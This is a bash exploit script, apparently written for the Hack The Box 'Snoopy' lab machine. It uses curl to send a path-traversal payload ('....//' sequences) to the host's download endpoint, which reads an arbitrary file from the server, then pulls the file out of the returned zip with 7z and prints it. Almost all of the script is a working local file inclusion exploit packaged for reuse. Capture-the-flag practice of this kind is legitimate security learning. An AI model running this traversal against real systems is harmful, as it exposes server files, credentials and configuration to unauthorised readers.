#!/bin/bash

# HTB Snoopy LFI
# --------------
# Author: Marss
# Date: 16 Sep, 2023

# Ctrl + c
# (function)
signal_handler(){
    echo -e "\n[!] User aborted."
    exit 1
}
# (signal)
trap signal_handler SIGINT

# Help panel
help_panel(){
    echo -e "\n| HTB Snoopy (LFI) |"
    echo
    echo -e "[*] Usage: $0 -f <file_to_read>"
}

# Main function
file_reader(){
    zip_file="tmp.zip"
    
    curl -s -G "http://snoopy.htb/download" \
        -d "file=....//....//....//....//$file_to_read" \
        -o $zip_file

    output=$(7z e -so $zip_file "press_package/$file_to_read" 2>&1)

    if [[ "$output" == *"ERROR"* ]]; then
        echo -e "\n[!] Invalid file."
    else    
        echo "$output"
    fi
    
    rm -f $zip_file
}

# Main flow
if [[ "$#" -eq 0 ]]; then
    help_panel
    exit 1
fi

while getopts ":hf:" opt
do
    case $opt in
        h)
            help_panel
            exit 1;;
        f)
            file_to_read=$OPTARG
            file_reader;;
        \?)
            echo -e "\n[-] Invalid option."
            exit 1;;
    esac
done